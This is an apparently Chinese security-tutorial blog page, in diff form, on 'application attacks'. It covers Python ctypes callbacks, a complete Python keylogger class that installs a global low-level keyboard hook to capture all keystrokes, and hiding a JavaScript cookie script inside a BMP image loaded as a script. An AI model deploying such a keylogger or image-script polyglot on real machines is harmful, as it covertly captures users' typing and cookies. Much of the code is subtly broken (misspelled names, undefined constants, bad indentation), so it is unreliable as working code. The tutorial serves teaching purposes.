+b<span class="token punctuation">.</span>values<span class="token operator">=</span><span class="token punctuation">(</span>c_int<span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#数组和指针的转化</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>b<span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>values<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出1 2 3</span>
+b<span class="token punctuation">.</span>values<span class="token operator">=</span>None    <span class="token comment" spellcheck="true">#设置指针为NULL</span>
+b<span class="token punctuation">.</span>values<span class="token operator">=</span><span class="token punctuation">(</span>c_byte<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#报错，类型不对。需要int*或int数组。这里是byte数组</span>
+b<span class="token punctuation">.</span>values<span class="token operator">=</span>cast<span class="token punctuation">(</span><span class="token punctuation">(</span>c_byte<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#正确，强制把byte数组转化为int</span></code></pre>
+<h3 id="8-回调函数"><a href="#8-回调函数" class="headerlink" title="8.回调函数"></a>8.回调函数</h3><ul>
+<li>ctypes允许在python中创建C回调函数指针，称为回调函数</li>
+<li>需要为回调函数创建一个类，该类知道调用协议，函数返回值类型，函数接受的参数个数及类型。ctypes通过工厂函数CFUNCTYPE()支持回调函数</li>
+<li>CFUNCTYPE函数使用普通cdecl调用约定来为回调函数创建类型。在Windows平台，WINFUNCTYPE函数使用stdcall调用约定来为回调函数创建类型</li>
+<li>调用这两个函数时，第一个参数为回调函数的返回值，剩下的参数为回调函数的参数<br>例：C标准库中的快排qsort()是一个借助回调函数进行排序的函数，C原型及其正常调用形式：</li>
+</ul>
+<pre class=" language-C++"><code class="language-C++">void qsort( void *base,    //数组的起始地址
+            size_t nmemb,    //数组的元素个数
+            size_t size,    //每个元素的大小（字节数）
+            int (*compar)(const void *,const void *)    //比较函数的函数指针
+);    //qsort函数原型
+
+int compare(const void *a, const void *)
+{    return (*(int*)a-*(int*)b);}
+int values[]={40,10,100,90,20,25};
+qsort(values,6,sizeof(int),compare);    //C中正常调用</code></pre>
+<p>Python借助ctypes回调函数进行qsort排序</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+libc<span class="token operator">=</span>cldd<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'msvcrt.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#(Microsoft Visual C Runtime Library)</span>
+CMPFUNC<span class="token operator">=</span>CFUNCTYPE<span class="token punctuation">(</span>c_int<span class="token punctuation">,</span> POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span> POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义回调函数类型</span>
+<span class="token keyword">def</span> <span class="token function">py_cmp_func</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#实现回调函数功能，python代码实现</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"py_cmp_func"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+cmp_func<span class="token operator">=</span>CMPFUNC<span class="token punctuation">(</span>py_cmp_func<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#回调函数对象</span>
+IntArray5<span class="token operator">=</span>c_int<span class="token operator">*</span><span class="token number">5</span>
+ia<span class="token operator">=</span>IntArray5<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span>
+qsort<span class="token operator">=</span>libc<span class="token punctuation">.</span>qsort    <span class="token comment" spellcheck="true">#排序函数地址</span>
+qsort<span class="token punctuation">.</span>restype<span class="token operator">=</span>None    <span class="token comment" spellcheck="true">#排序函数返回值</span>
+qsort<span class="token punctuation">(</span>ia<span class="token punctuation">,</span>len<span class="token punctuation">(</span>ia<span class="token punctuation">)</span><span class="token punctuation">,</span>sizeof<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span>cmp_func<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用排序函数，传入一个回调函数对象</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> ia<span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span></code></pre>
+<h3 id="9-windows类型"><a href="#9-windows类型" class="headerlink" title="9.windows类型"></a>9.windows类型</h3><ul>
+<li>Windows API函数不使用标准C的调用约定<ul>
+<li>LoadLibrary时不能够使用cdll.LoadLibrary而使用windll.LoadLibrary</li>
+<li>在声明回调函数指针类型的时候，不能用CFUNCTYPE而是用WINFUNCTYPE</li>
+</ul>
+</li>
+<li>Windows API有很多内建类型，ctypes内部都已经定义好了，导入子模块wintypes后，可以直接使用</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> wintypes    <span class="token comment" spellcheck="true">#HWND等类型已定义好了，可直接使用</span>
+WNDENUMPROC<span class="token operator">=</span>WINFUNCTYPE<span class="token punctuation">(</span>wintypes<span class="token punctuation">.</span>BOOL<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#定义回调函数类型</span>
+                        wintypes<span class="token punctuation">.</span>HWND<span class="token punctuation">,</span>
+                        wintypes<span class="token punctuation">.</span>LPARAM<span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">EnumWindowsProc</span><span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#实现回调函数功能</span>
+    length<span class="token operator">=</span>user32<span class="token punctuation">.</span>GetWindowTextLengthW<span class="token punctuation">(</span>hwnd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span>
+    buffer<span class="token operator">=</span>create_unicode_buffer<span class="token punctuation">(</span>length<span class="token punctuation">)</span>
+    user32<span class="token punctuation">.</span>GetWindowTextW<span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span>buffer<span class="token punctuation">,</span>length<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#将指定窗口的标题条文本拷贝到一个缓冲区</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>buffer<span class="token punctuation">.</span>value<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token boolean">True</span>
+user32<span class="token operator">=</span>windll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'user32.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#加载dll</span>
+user32<span class="token punctuation">.</span>EnumWindows<span class="token punctuation">(</span>WNDENUMPROC<span class="token punctuation">(</span>EnumWindowsProc<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#枚举所有屏幕上的顶层窗口，将窗口句柄传送给应用程序定义的回调函数</span></code></pre>
+<h1 id="五、键盘钩子"><a href="#五、键盘钩子" class="headerlink" title="五、键盘钩子"></a>五、键盘钩子</h1><ul>
+<li>使用user32.dll提供的SetWindowsHookEx()函数，可以设置钩子。有消息到来或发生鼠标点击、键盘输入事件时，操作系统提供了中间拦截机制，这称为“钩子”。从功能上实现这种机制的函数称为钩子过程（回调函数）</li>
+<li>操作系统支持为一个钩子类型（鼠标点击、键盘输入等）设置多个钩子过程，并通过钩链管理链表</li>
+<li>每一个Hook都有一个与之相关联的指针列表，称之为钩子链表，由系统来维护。这个列表的指针指向指定的，应用程序定义的，被Hook子程调用的回调函数，也就是该钩子的各个处理子程</li>
+<li>最后安装的钩子放在链的开始，而最早安装的钩子放在最后，也就是后加入的先获得控制权</li>
+<li>钩子分为本地钩子（LocalHook）与全局钩子（GlobalHook）两种。本地钩子 是针对特定线程设置的，全局钩子针对操作系统中运行的所有线程设置<ul>
+<li>钩子类型为键盘输入时，通过为键盘输入设置全局钩子可以对用户的所有键盘输入进行监视。若设置的是本地钩子，则只有相应线程管理的窗口激活后，键盘输入才会触发对钩子过程的调用</li>
+</ul>
+</li>
+</ul>
+<h3 id="1-键盘钩子机制"><a href="#1-键盘钩子机制" class="headerlink" title="1.键盘钩子机制"></a>1.键盘钩子机制</h3><ul>
+<li>1.设置钩子：通过user32.dll的SetWindowsHookEx()函数可以设置钩子，注册用于处理消息的钩子过程（回调函数）</li>
+<li>2.注册钩链：注册后的钩子过程由钩链管理，钩链的最前面注册有钩子过程的指针。接下来，等待键盘输入类型的消息进入相关线程对队列</li>
+<li>3.键盘输入：用户使用键盘向计算机输入想要的消息。键盘控制器将用户输入转换为计算机可识别的信号，并传递给键盘驱动程序</li>
+<li>4.系统队列：来自键盘的消息进入操作系统管理的系统队列，等待进入负责处理消息的线程队列</li>
+<li>5.线程队列：消息进入处理线程的队列后，不会被发送到相应窗口，而是发送给钩链中第一个指针所指的钩子过程</li>
+<li>6.消息钩取：来自线程队列的消息被传递给钩链中第一个指针（实际是指针所指的钩子过程）</li>
+<li>7.钩子过程：钩子过程接收消息，执行程序员指定的动作。大部分黑客攻击代码都位于钩子过程。处理结束后，将消息传递给钩链的下一个指针，也称为回调函数</li>
+<li>8.钩链指针：消息被依次传递给钩链中指针所指的钩子过程。最后一个钩子过程处理完消息后，将消息传递给原先指定的窗口</li>
+<li>设置好钩子后，即可对队列持续进行监视，这会加重系统负担。完成指定任务后，一定要拆除钩子，尽量减少对系统性能的影响<br><img src="https://www.hualigs.cn/image/60534b2953b5e.jpg" alt=""></li>
+</ul>
+<h3 id="2-SetWindowsHookEx函数"><a href="#2-SetWindowsHookEx函数" class="headerlink" title="2.SetWindowsHookEx函数"></a>2.SetWindowsHookEx函数</h3><pre class=" language-C++"><code class="language-C++">HHOOK WINAPI SetWindowsHookEx(
+    __in int idHook,    //钩子类型，选择对何种类型的消息进行钩取
+    __in HOOKPROC lpfn,    //回调函数地址
+    __in HINSTANCE hMod,    //应用程序实例的句柄
+    __in DWORD dwThreadId    //线程ID，若为0，钩子与所有线程关联，即为全局钩子
+);    //函数执行成功，则返回值就是该钩子过程的句柄；若此函数执行失败，则返回值为NULL(0)
+
+//例：SetWindowsHookEx(WH_KEYBOARD,KeyBoardProc,HInstance,0);</code></pre>
+<h3 id="3-利用ctypes的调用结构"><a href="#3-利用ctypes的调用结构" class="headerlink" title="3.利用ctypes的调用结构"></a>3.利用ctypes的调用结构</h3><pre class=" language-python"><code class="language-python">CMPFUNC<span class="token operator">=</span>CFUNCTYPE<span class="token punctuation">(</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_void_p<span class="token punctuation">)</span><span class="token punctuation">)</span>
+pointer<span class="token operator">=</span>CMPFUNC<span class="token punctuation">(</span>hook_Procedure<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#hook_Procedure由用户定义</span>
+windll<span class="token punctuation">.</span>user32<span class="token punctuation">.</span>SetWindowsHookEx<span class="token punctuation">(</span>
+    <span class="token number">13</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#WH_KEYBOARD_LL</span>
+    pointer<span class="token punctuation">,</span>
+    windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>GetModuleHandle<span class="token punctuation">(</span>None<span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token number">0</span>
+<span class="token punctuation">)</span></code></pre>
+<h3 id="4-钩子子程"><a href="#4-钩子子程" class="headerlink" title="4.钩子子程"></a>4.钩子子程</h3><ul>
+<li>应用程序定义的回调函数（CALLBACK Function），定义为普通的C函数。用以监视系统或某一特定类型的事件</li>
+</ul>
+<pre class=" language-C++"><code class="language-C++">LRESULT CALLBACK HookProc(
+    int nCode,    //Hook代码
+    WPARAM wParam,    //消息参数
+    LPARAM lParam);</code></pre>
+<ul>
+<li>使用API函数SetWindowsHookEx()把一个应用程序定义的钩子子程安装到钩子链表中</li>
+<li>处理完消息后，调用API函数CallNextHookEx来继续传递该消息</li>
+<li>钩子在使用完之后需要用UnhookWindowsHookEx()卸载</li>
+</ul>
+<p>例：设置全局钩子，将用户的所有键盘输入显示到控制台。若计算机中没有安装键盘安全程序，则会看到键盘输入的所有内容都在控制台中显示</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> ctypes<span class="token punctuation">.</span>wintypes <span class="token keyword">import</span> MSG
+<span class="token keyword">from</span> ctypes<span class="token punctuation">.</span>wintypes <span class="token keyword">import</span> DWORD
+
+<span class="token triple-quoted-string string">'''
+使用windll：声明user32与kernel32类型的变量。使用相应DLL提供的函数时，格式为unicode
+'''</span>
+user32<span class="token operator">=</span>windll<span class="token punctuation">.</span>user32
+kernel32<span class="token operator">=</span>windll<span class="token punctuation">.</span>kernel32
+
+WH_KEYBOARD_LL<span class="token operator">=</span><span class="token number">13</span>    <span class="token comment" spellcheck="true">#变量声明：在Win32 API内部定义并使用的变量值</span>
+WH_KEYDOWN<span class="token operator">=</span><span class="token number">0x0100</span>
+CTRL_CODE<span class="token operator">=</span><span class="token number">162</span>
+
+<span class="token keyword">class</span> <span class="token class-name">KeyLogger</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义类：定义拥有挂钩与拆钩功能的类</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>lUser32<span class="token operator">=</span>user32
+        self<span class="token punctuation">.</span>hooked<span class="token operator">=</span>None
+
+    <span class="token triple-quoted-string string">'''
+    定义挂钩函数：使用user32.DLL的SetWindowsHookExA()函数设置钩子,要监视的事件为WH_KEYBOARD_LL，范围设置为操作系统中运
+    '''</span>
+    <span class="token keyword">def</span> <span class="token function">installHookProc</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>pointer<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    self<span class="token punctuation">.</span>hooked<span class="token operator">=</span>self<span class="token punctuation">.</span>lUser32<span class="token punctuation">.</span>SetWindowsHookExA<span class="token punctuation">(</span>WH_KEYBOARD_LL<span class="token punctuation">,</span>pointer<span class="token punctuation">,</span>kernel32<span class="token punctuation">.</span>GetModuleHandleW<span class="token punctuation">(</span>None<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>hooked<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token boolean">False</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+
+    <span class="token triple-quoted-string string">'''
+    定义拆钩函数：调用user32.DLL中的UnhookwindowsHookEx()函数，拆除之前设置的钩子
+    '''</span>
+    <span class="token keyword">def</span> <span class="token function">unInstallHookProc</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>hooked <span class="token keyword">is</span> None<span class="token punctuation">:</span>
+            <span class="token keyword">return</span>
+        self<span class="token punctuation">.</span>lUser32<span class="token punctuation">.</span>UnhookwindowsHookEx<span class="token punctuation">(</span>self<span class="token punctuation">.</span>hooked<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>hooked<span class="token operator">=</span>None
+
+<span class="token triple-quoted-string string">'''
+获取函数指针：若想注册钩子过程（回调函数），必须穿入函数指针
+'''</span>
+<span class="token keyword">def</span> <span class="token function">getFPTR</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    CMPFUN<span class="token operator">=</span>CFUNCTYPE<span class="token punctuation">(</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_void_p<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> CMPFUNC<span class="token punctuation">(</span>fn<span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">'''
+定义钩子过程
+'''</span>
+<span class="token keyword">def</span> <span class="token function">hookProc</span><span class="token punctuation">(</span>nCode<span class="token punctuation">,</span>wParam<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> wParam <span class="token keyword">is</span> <span class="token operator">not</span> WM_KEYDOWN<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> user32<span class="token punctuation">.</span>CallNextHookEx<span class="token punctuation">(</span>keylogger<span class="token punctuation">.</span>hooked<span class="token punctuation">,</span>nCode<span class="token punctuation">,</span>wParam<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span>
+    hookedkey<span class="token operator">=</span>chr<span class="token punctuation">(</span>lParam<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>hookedkey<span class="token punctuation">)</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>CTRL_CODE<span class="token operator">==</span>int<span class="token punctuation">(</span>lParam<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Crl pressed, call unistallHook()"</span><span class="token punctuation">)</span>
+        KeyLogger<span class="token punctuation">.</span>unistallHookProc<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> user32<span class="token punctuation">.</span>CallNextHookEx<span class="token punctuation">(</span>KeyLogger<span class="token punctuation">.</span>hooked<span class="token punctuation">,</span>nCode<span class="token punctuation">,</span>wParam<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">'''
+传递消息：GetMessageA()函数监视队列
+'''</span>
+<span class="token keyword">def</span> <span class="token function">startKeyLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    msg<span class="token operator">=</span>MSG<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    user32<span class="token punctuation">.</span>GetMessageA<span class="token punctuation">(</span>byref<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#启动消息钩取</span>
+keyLogger<span class="token operator">=</span>KeyLogger    <span class="token comment" spellcheck="true">#start of hook process</span>
+pointer<span class="token operator">=</span>getFPTR<span class="token punctuation">(</span>hookProc<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> keyLogger<span class="token punctuation">.</span>installHookProc<span class="token punctuation">(</span>pointer<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"installed keyLogger"</span><span class="token punctuation">)</span>
+
+startKeyLog<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h1 id="六、图片文件攻击"><a href="#六、图片文件攻击" class="headerlink" title="六、图片文件攻击"></a>六、图片文件攻击</h1><ul>
+<li><p>向图片（BMP）文件中插入JavaScript脚本，实现对Cookie的读写操作</p>
+</li>
+<li><p>创建hello.bmp，用WinHex打开图片文件，可看到前2字节是“魔数”，用于标识位图文件。0x42、0x4D分别对应字母B和M的ASCII码。随后的4字节整数用于指示BMP文件的大小，单位为字节</p>
+</li>
+<li><p>图片文件攻击机制<br><img src="https://www.hualigs.cn/image/60534b2952afa.jpg" alt=""></p>
+</li>
+<li><p>浏览器可以生成并保存Cookie。Cookie是保存在PC中供浏览器使用的短小信息。浏览器将Cookie保存到自身内存空间或保存为文件，保存用户登录信息与会话信息时。如果黑客窃取了Cookie，就可以将其用于多种攻击</p>
+</li>
+<li><p>Cookie以名称=值对的形式保存。示例中，将name=’id’与value=’Jack’保存到Cookie，示例中设置有效期为7天，最后添加脚本，将Cookie内容显示到警告窗口</p>
+</li>
+<li><p>要插入位图文件的脚本hello.js</p>
+</li>
+</ul>
+<pre class=" language-python"><code class="language-python">name<span class="token operator">=</span><span class="token string">'id'</span><span class="token punctuation">;</span>
+value<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">;</span>
+var todayDate<span class="token operator">=</span>new Date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+todayDate<span class="token punctuation">.</span>setHours<span class="token punctuation">(</span>todayDate<span class="token punctuation">.</span>getDate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+document<span class="token punctuation">.</span>cookie<span class="token operator">=</span>name<span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span>escape<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">";path=/;expires="</span> <span class="token operator">+</span>todayDate<span class="token punctuation">.</span>toGMTString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">;</span>
+alert<span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<ul>
+<li>向位图文件插入脚本的Python程序</li>
+<li>向位图文件插入了脚本，位图文件大小有所增加，肉眼查看图片质量无明显变化。若使用WinHex之类的编辑器打开位图文件，可以看到图片文件所做的修改</li>
+<li>编写简单的HTML文件，嵌入显示已含有脚本的位图文件</li>
+</ul>
+<pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"hello.bmp"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>显示图像<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"hello.bmp"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>    <span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>运行脚本<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></code></pre>
+<p>3/18/2021 9:04:09 PM </p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">妖寂</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://yoursite.com/2021/03/18/ying-yong-cheng-xu-gong-ji/">http://yoursite.com/2021/03/18/ying-yong-cheng-xu-gong-ji/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">妖寂</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2021/03/18/ying-yong-cheng-xu-gong-ji/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="应用程序攻击">
+                        
+                        <span class="card-title">应用程序攻击</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
